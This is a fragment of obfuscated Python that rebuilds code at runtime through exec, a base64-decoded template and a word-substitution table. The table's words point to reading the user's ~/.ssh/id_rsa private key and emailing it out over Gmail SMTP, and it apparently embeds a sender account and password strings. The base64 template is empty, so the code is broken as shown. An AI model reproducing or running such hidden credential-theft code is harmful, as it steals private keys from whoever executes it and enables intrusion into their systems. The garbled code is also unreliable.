...
exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|import|msg|email|expanduser|the|MIMEText|text|gmail|a|address|smtplib|format|plain|f|com|recipient|s|as_string|sendmail|starttls|SMTP|os|contents|From|contains|file|envelope|path|from|Subject|modules|example|M4L01f9|reading|include|Import|for|id_rsa|Create|sender|fp|assume|header|server|ssh|close|ASCII|login|need|Send|smtp|read|only|8cuN|Open|that|this|open|mime|quit|ehlo|To|but|For|n|characters|str|The|our|via|don|own|you|me|of|rb|listdir|in|ll|we|jamesrobertalbert|t|message".split("|")))
